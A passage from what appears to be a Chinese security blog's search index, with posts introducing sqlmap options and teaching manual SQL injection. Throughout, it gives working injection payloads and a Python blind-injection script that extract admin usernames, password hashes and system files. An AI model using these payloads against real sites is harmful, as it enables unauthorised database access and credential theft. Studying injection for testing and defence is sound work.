<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>sqlmap使用介绍</title>
      <link href="/2019/04/01/sqlmap%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/"/>
      <url>/2019/04/01/sqlmap%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">sqlmap使用介绍</font></center><h1 id="sqlmap介绍"><a href="#sqlmap介绍" class="headerlink" title="sqlmap介绍"></a><font color="#3399FF">sqlmap介绍</font></h1><hr><ol><li>sqlmap工作步骤：<br>判断可注入的参数-&gt;判断可以用哪种sql注入技术来注入-&gt;识别出哪种数据库-&gt;根据用户选择和读取哪些数据。<br>会测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入</li><li>sqlmap支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。可以提供一个简单的URL，Burp或WebScarab请求日志文件，文本文档中的完整http请求或者Google的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。</li><li>sqlmap支持五种不同注入模式：<br>1：基于布尔的盲注，即可以根据返回页面判断条件真假的注入。<br>2：基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。<br>3：基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br>4：联合查询注入，可以使用union的情况下的注入。<br>5：堆查询注入，可以同时执行多条语句的执行时的注入。</li></ol><h1 id="sqlmap三种等级"><a href="#sqlmap三种等级" class="headerlink" title="sqlmap三种等级"></a><font color="#3399FF">sqlmap三种等级</font></h1><hr><ol><li><p>sqlmap注入<font color="#66FFFF">检测等级</font>(默认为1,-v,七个等级):<br>观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据<br>0：只显示python错误以及严重的信息。<br>1：同时显示基本信息和警告信息。<br>2：同时显示debug信息。<br>3：同时显示注入的payload。<br>4：同时显示HTTP请求。<br>5：同时显示HTTP响应头。<br>6：同时显示HTTP响应页面。</p></li><li><p>sqlmap注入<font color="#66FFFF">探测等级</font>(默认为1,–level,五个等级):<br>影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTPUser-Agent/Referer头在level为3的时候就会测试。<br>总之在不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p></li><li><p>sqlmap注入<font color="#66FFFF">风险等级</font>(默认为1,–rsik,三个等级):<br>1：会测试大部分的测试语句<br>2：会增加基于事件的测试语句sql<br>3：会增加OR语句的SQL注入测试<br>(例：在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险)</p></li></ol><h1 id="sqlmap使用介绍"><a href="#sqlmap使用介绍" class="headerlink" title="sqlmap使用介绍"></a><font color="#3399FF">sqlmap使用介绍</font></h1><hr><ol><li><p>扫描目标：<br> 1：目标URL(<font color="#66FFFF">-u/-url</font>)：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://www.target.com/vuln.php?id=1"</span><br></pre></td></tr></table></figure><p> 2：从Burp或者WebScarab代理中获取日志(<font color="#66FFFF">-l</font>)：<br> 可以直接吧Burp proxy或者WebScarab proxy中的日志直接倒出来交给sqlmap来一个一个检测是否有注入。<br> 3：从文件获取多个扫描目标(<font color="#66FFFF">-m</font>)：<br> 文件中保存url格式如下，sqlmap会一个一个检测。<br> 4：从文件中加载HTTP请求(<font color="#66FFFF">-r</font>)：<br> sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）<br> 5：请求为HTTPS时(<font color="#66FFFF">-force-ssl</font>)：<br> 当请求是HTTPS的时候你需要配合这个–force-ssl参数来使用，或者你可以在Host头后门加上:443<br> 6：google的搜索结果(<font color="#66FFFF">-g</font>)：<br> sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）,非常强大的功能。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -g "inurl:".php?id=1""</span><br></pre></td></tr></table></figure><p> 7：请求为http的时候(<font color="#66FFFF">-data</font>)：<br> 此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://www.target.com/vuln.php" <span class="comment">--data="id=1" -f --banner --dbs --users</span></span><br></pre></td></tr></table></figure></li><li><p>参数拆分字符(<font color="#66FFFF">–param-del</font>)：<br>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u "http://www.target.com/vuln.php" <span class="comment">--data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users</span></span><br></pre></td></tr></table></figure></li><li><p>HTTP cookie头(<font color="#66FFFF">–cookie/–load-cookies/–drop-set-cookie</font>)：<br>web应用需要登陆的时候或者要在这些头参数中测试SQL注入时。可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p></li><li><p>HTTP User-Agent头(<font color="#66FFFF">–user-agent/–random-agent</font>)：<br>默认情况下sqlmap的HTTP请求头中User-Agent值是||sqlmap/1.0-dev-xxxxxxx||。可以使用–user-anget参数来修改，同时也可以使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p></li><li><p>HTTP Referer头(<font color="#66FFFF">–referer</font>):<br>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入。</p></li><li></li></ol><font color="#66FFFF"></font><h1 id="lt-f-sqlmap使用介绍"><a href="#lt-f-sqlmap使用介绍" class="headerlink" title="&lt;f# sqlmap使用介绍"></a>&lt;f# <font color="#3399FF">sqlmap使用介绍</font></h1>]]></content>
      
      
      <categories>
          
          <category> 工具介绍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap介绍 </tag>
            
            <tag> sqlmap三种等级 </tag>
            
            <tag> sqlmap使用介绍 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入</title>
      <link href="/2019/03/31/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/03/31/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<center><font color="#4094C7" size="4">SQL注入超详细分析介绍</font></center><h1 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a><font color="#3399FF">SQL注入介绍</font></h1><hr><ol><li>Sql介绍：Sql是一种解释型语言，在运行时是由一个组件解释语言代码并执行其中包含指令的语言。而这种执行方式产生了SQL注入漏洞。</li><li>产生原因：Web服务器在执行数据查找的Sql语句时，该语句由程序员编写的代码和用户提交的数据拼接组成。而程序员在web开发时，没有过滤敏感字符，绑定变量，导致攻击者可以通过Sql灵活多变的语法，<font color="#66FFFF">构造精心巧妙的语句</font>，不择手段，达成目的，或者通过系统报错，返回对自己有用的信息。</li></ol><h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a><font color="#3399FF">SQL注入攻击</font></h1><hr><ol><li>SQL注入点判断(一般存在形式：<font color="#66FFFF">/abc.asp?id=XX</font>)：<br>1：如果URL中传递的参数(一般为id)是数字，测试<font color="#66FFFF">id=2-1</font>与<font color="#66FFFF">id=1</font>返回的结果是否相同，如果做了2-1=1的运算，说明可能存在<font color="#66FFFF">数字型注入</font>。如果要用<font color="#66FFFF">+号</font>运算的话，因为URL编码的问题，需要把加好换成<font color="#66FFFF">%2B</font>，如<font color="#66FFFF">id=1%2B1</font>。<br>2：在参数后面加<font color="#66FFFF">单引号</font>或<font color="#66FFFF">双引号</font>，判断返回结果是否有报错。<br>3：添加注释符，判断前后是否有报错，如<font color="#66FFFF">id=1’ –+ </font>或 <font color="#66FFFF">id=1” –+ </font>或<font color="#66FFFF">id=1’ # </font>或<font color="#66FFFF">id=1” –+ </font>（–后面跟+号，是把+当成空格使用）。<br>4：有些参数可能在括号里面，如：SELECT first_name, last_name FROM users WHERE user_id = （’$id’）；所以也可以在参数后面加单双引号和括号，如i<font color="#66FFFF">d=1’)  –+ </font>或 <font color="#66FFFF">id=1”) –+ </font>或<font color="#66FFFF">id=1’) # </font>或<font color="#66FFFF">id=1”) –+ </font>。<br>5：参数后面跟<font color="#66FFFF">or</font> 或者<font color="#66FFFF">and</font>，判断返回结果是否有变化，如<font color="#66FFFF">1’ or ‘a’=’a  </font>或者<font color="#66FFFF">and ‘a’=’a</font>或者<font color="#66FFFF">1’ or ‘a’=’b</font>或者<font color="#66FFFF">1’ or ‘1’=’2</font>。<br>6：如果返回的正确页面与错误页面都一样，可以考虑<font color="#66FFFF">时间延迟</font>的方法判断是否存在注入，如  <font color="#66FFFF">1’ and sleep(5)</font>。<br>7：注：<font color="#66FFFF">Class=连续剧</font> 这类注入的参数是字符型；<font color="#66FFFF">ID=49</font> 这类注入的参数是数字型。</li><li>数据库类型判断：<ul><li>基于特定函数判断：<ul><li><font color="#66FFFF">len</font>和<font color="#66FFFF">length</font>：在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。当你使用<font color="#66FFFF">and len(‘a’)=1</font>的时候，返回正常页面时，可以推断当前的数据库类型可能是mssql，或mysql，或是db2。反之则可能会是oracle和informix。</li><li><font color="#66FFFF">@@version</font>和<font color="#66FFFF">version()</font>：在mysql内，可以用@@version或是version()来返回当前的版本信息。但无法判断是mysql还是mssql时，可以用version()函数来构造判断。version()&gt;1 返回与@@version&gt;1 相同页面时，则可能是mysql。如果出现提示version()错误时，则可能是mssql。</li><li><font color="#66FFFF">substring</font>和<font color="#66FFFF">substr</font>：在mssql中可以调用substring。oracle则只可调用substr</li></ul></li><li>基于辅助的符号判断：<ul><li><font color="#66FFFF">/* </font>是MySQL中的注释符，返回错误说明该注入点不是MySQL，继续提交如下查询字符;</li><li><font color="#66FFFF">– </font>是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。继续提交如下查询字符;</li><li><font color="#66FFFF">;  </font>是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</li><li><font color="#66FFFF">and exists (select count( 星号 ) from sysobjects)</font>：意思是查询sysobjects表里记录数大于,返回正常的，说明大于0且存在sysobjects这个表，因为这个表只有MSSQL数据库才有，所以可以判断为MSSQL数据库。返回错误则表示不是。<font color="#66FFFF">and exists (select count( 星号 ) from msysobjects)</font>：这句提交是不会返回正常页面的，就算是ACCESS数据库也不会返回正常。因为默认情况下我们没有权限查询这个表里的数据。WEB会提示我们“记录无法读取;’msysobjects’没有读取权限”，如果返回的是这个错误信息的话，那就证明是ACCESS数据库了。第一条返回正常，就是MSSQL数据库，如果两条都不正常，那就是ACCESS数据库了。以上参数都是int的时候，如果是字符型的话首先在参数后面加上单引号，然后再在查询语句后加上;–</li></ul></li><li>基于显示错误信息判断：<br>  -注入点后直接加上<font color="#66FFFF">单引号</font>，根据服务器的报错信息来判断数据库。错误提示Microsoft JET Database Engine 错误 ‘80040e14’，说明是通过JET引擎连接数据库，则表明数据库为ACCESS数据库，如果是ODBC的话则说明是MSSQL数据库。</li></ul></li><li>手工注入常用语句：<br>1： <font color="#66FFFF">xxx.php?id=2900 and 1=1    </font>：组合判断是否存在注入点。<br>2： <font color="#66FFFF">xxx.php?id=2900 and 1=2    </font>：组合判断注入点，若返回错误同时1=1正确，则存在注入点<br>3： <font color="#66FFFF">xxx.php?id=2900 and ‘1’=’1’</font>：错误则说明PHP开启了magic_quotes_gpc=on，不能直接利用注入语句写webshell了。<br>4： <font color="#66FFFF">xxx.php?id=2900 order by 15</font>：尝试当前注入语句的表中字段个数从大到小，错误说明数字偏大。<br>5： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14</font>：联合查询语句，暴出可显示字段。<br>6： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(user(),0x5e5e,version(),0x5e5e,database(),0x5e5e,@@basedir),7,8,9,10,11,12,13,14</font>：暴出数据库用户、版本、库名和路径信息。<br>7： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,load_file(0x633a5c626f6f742e696e69),7,8,9,10,11,12,13,14</font>：读取windows系统文件boot.ini。<br>8： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(table_name),7,8,9,10,11,12,13,14 from information_schema.tables where table_schema=database()</font>：暴出当前库中的所有表名。<br>9： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(column_name),7,8,9,10,11,12,13,14 from information_schema.columns where table_name=0x6163636f756e74</font>：暴出account表中的所有字段名。<br>10： <font color="#66FFFF">xxx.php?id=2900 and 1=2 union select 1,2,3,4,5,group_concat(username,0x5e,password),7,8,9,10,11,12,13,14 from account</font>：暴出username和password字段里的内容。</li></ol><h1 id="SQL注入盲注"><a href="#SQL注入盲注" class="headerlink" title="SQL注入盲注"></a><font color="#3399FF">SQL注入盲注</font></h1><hr><ol><li><p>盲注介绍：在SQL注入过程中，构造Sql语句执行后，数据无法返回到前端页面，我们根据返回页面的不同类型来判断信息(可能是页面内容不同，也可以是响应时间不同)。</p></li><li><p>盲注类型：<font color="#66FFFF">基于布尔SQL盲注</font>、<font color="#66FFFF">基于时间的SQL盲注</font>、<font color="#66FFFF">基于报错的SQL盲注</font>。</p><ol><li>基于布尔的SQL盲注：最长接触到的普通盲注，比如<font color="#66FFFF">where语句中构造or 1=1</font>来使返回页面不同。如果注入点在<font color="#66FFFF">order by</font>后面，那么则可以使用判断语句来构造报错。</li><li>基于时间的SQL盲注：<font color="#66FFFF">select 1 from te where if(1=1,sleep(1),1) limit 0,1;</font>和<font color="#66FFFF">select 1 from te where if(1=2,sleep(1),1) limit 0,1;</font>，推荐使用sleep而不使用benchmark，因为sleep不会占用cpu比较稳定。</li><li>基于报错的SQL盲注：如果页面上显示数据的报错信息，那么可以直接使用报错的方式把想要的信息爆出来。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 经典报错语句： <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br><span class="line">2. 简化形式： <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br><span class="line"><span class="number">3.</span> 关键表被禁用时： <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br><span class="line"><span class="number">4.</span> <span class="keyword">rand</span>被禁用时： <span class="keyword">select</span> <span class="keyword">min</span>(@a:=<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">password</span>,@a:=(@a+<span class="number">1</span>)%<span class="number">2</span>)</span><br><span class="line"><span class="number">5.</span> 在mysql5<span class="number">.1</span>版本中加入<span class="keyword">xml</span>函数：<span class="keyword">select</span> * <span class="keyword">from</span> article <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x5c</span>,(<span class="keyword">select</span> pass <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">1</span>)));</span><br><span class="line">或者：<span class="keyword">select</span> * <span class="keyword">from</span> article <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5e24</span>,(<span class="keyword">select</span> pass <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x5e24</span>),<span class="number">1</span>));  </span><br><span class="line">6. PostgreSQL： /?param=1 and(1)=cast(version() as numeric)<span class="comment">-- </span></span><br><span class="line">7. MSSQL: /?param=1 and(1)=convert(int,@@version)<span class="comment">-- </span></span><br><span class="line">8. Sybase: /?param=1 and(1)=convert(int,@@version)<span class="comment">-- </span></span><br><span class="line">9. Oracle &gt;=9.0 :/?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select </span><br><span class="line"><span class="keyword">replace</span>(banner,<span class="keyword">chr</span>(<span class="number">32</span>),<span class="keyword">chr</span>(<span class="number">58</span>)) <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>)||<span class="keyword">chr</span>(<span class="number">62</span>))) <span class="keyword">from</span> dual)<span class="comment">--</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>暴力猜解(一般都是暴力猜解每一位ascii码，有些加快的方法)：</p><ol><li>字频统计：根据英文字母出现频率猜测,出现最多的先来。</li><li>二分查找，位运算法：把试探字符串的次数降低到log(n) x length (n为可能字符的数量)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#二分查找的python源代码(针对32位hash的盲注)</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doinject</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'xxxxxxxxxxxxxxxxxxxxx'</span></span><br><span class="line">    values = &#123;<span class="string">'injection'</span>:payload,<span class="string">'inject'</span>:<span class="string">'Inject'</span>&#125;</span><br><span class="line">    data = urllib.urlencode(values)</span><br><span class="line">    <span class="comment">#print data</span></span><br><span class="line">    req = urllib2.Request(url, data)</span><br><span class="line">    req.add_header(<span class="string">'cookie'</span>,<span class="string">'xx=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    the_page = response.read()</span><br><span class="line">    <span class="keyword">if</span> (the_page.find(<span class="string">"Welcome back"</span>)&gt;<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    </span><br><span class="line">wordlist = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    s=<span class="number">0</span></span><br><span class="line">    t=<span class="number">15</span></span><br><span class="line">    <span class="keyword">while</span> (s&lt;t):</span><br><span class="line">        <span class="keyword">if</span> (t-s==<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> doinject(<span class="string">'\' or substring(password,'</span>+str(i)+<span class="string">',1)=\''</span>+wordlist[t]+<span class="string">'\' -- LanLan'</span>):</span><br><span class="line">                m=t</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m=s</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        m=(s+t)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> doinject(<span class="string">'\' or substring(password,'</span>+str(i)+<span class="string">',1)&gt;\''</span>+wordlist[m]+<span class="string">'\' -- LanLan'</span>):</span><br><span class="line">            s=m+<span class="number">1</span></span><br><span class="line">            <span class="keyword">print</span> wordlist[s]+<span class="string">":"</span>+wordlist[t]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t=m</span><br><span class="line">            <span class="keyword">print</span> wordlist[s]+<span class="string">":"</span>+wordlist[t]</span><br><span class="line">    res = res+wordlist[m]</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></li></ol></li></ol><h1 id="SQL手工注入小结"><a href="#SQL手工注入小结" class="headerlink" title="SQL手工注入小结"></a><font color="#3399FF">SQL手工注入小结</font></h1><hr><ol><li>准备：先把IE菜单=&gt;工具=&gt;Internet选项=&gt;高级=&gt;显示友好 HTTP 错误信息前面的勾去掉。否则，不论服务器返回什么错误，IE都只显示为HTTP 500服务器错误，不能获得更多的提示信息。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">数字型：and 1=1 and 1=2 判断是否存在注入</span><br><span class="line">字符型：' and '1'='1 ' and '1'='2</span><br><span class="line">搜索型： 关键字%' and 1=1 and '%'='% 关键字%' and 1=2 and '%'='%</span><br><span class="line"></span><br><span class="line">IIS报错情况下使用： </span><br><span class="line">and user&gt;0 （判断是ACCESS还是MSSQL）</span><br><span class="line"></span><br><span class="line">不报错则使用各自数据库特性来判断</span><br><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> msysobjects)&gt;<span class="number">0</span> （返回权限不足<span class="keyword">access</span>数据库）</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span> （返回正常则为MSSQL数据库）</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> db_name（）&gt;<span class="number">0</span> (返回数据库名)</span><br><span class="line"><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> @@<span class="keyword">version</span>)<span class="comment">-- (判断版本信息)</span></span><br><span class="line"><span class="keyword">and</span> db_name（）&gt;<span class="number">0</span> （返回数据库名）</span><br><span class="line"></span><br><span class="line"><span class="comment">---------------------注意：猜解之前先要找到后台地址，不然白忙了---------------------------</span></span><br><span class="line"><span class="keyword">ACCESS</span>注入：</span><br><span class="line"></span><br><span class="line">猜解表名（正常则存在<span class="keyword">admin</span>,不正常则不存在）</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> * <span class="keyword">from</span> [<span class="keyword">admin</span>])</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">Select</span> <span class="keyword">Count</span>(*) <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;<span class="number">0</span></span><br><span class="line"></span><br><span class="line">猜解字段:（字段username存在则正常，不正常则不存在）</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">Select</span> username <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;<span class="number">0</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> username <span class="keyword">from</span> [<span class="keyword">admin</span>])</span><br><span class="line"></span><br><span class="line">猜解用户名和密码长度</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(username) <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;<span class="number">0</span> </span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;<span class="number">0</span></span><br><span class="line">原 理：如果top <span class="number">1</span>的username长度大于<span class="number">0</span>，则条件成立；接着就是&gt;<span class="number">1</span>、&gt;<span class="number">2</span>、&gt;<span class="number">3</span>这样测试下去，一直到条件不成立为止，比如&gt;<span class="number">4</span>成 立，&gt;<span class="number">5</span>不成立，就是<span class="keyword">len</span>(username)=<span class="number">5</span>,即用户名长度为<span class="number">5.</span>得到username的长度后，用<span class="keyword">mid</span>(username,N,<span class="number">1</span>)截 取第N位字符，再<span class="keyword">asc</span>(<span class="keyword">mid</span>(username,N,<span class="number">1</span>))得到<span class="keyword">ASCII</span>码. </span><br><span class="line"></span><br><span class="line">猜解用户</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(username,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;<span class="number">0</span>，<span class="number">1</span>，<span class="number">2</span>…,</span><br><span 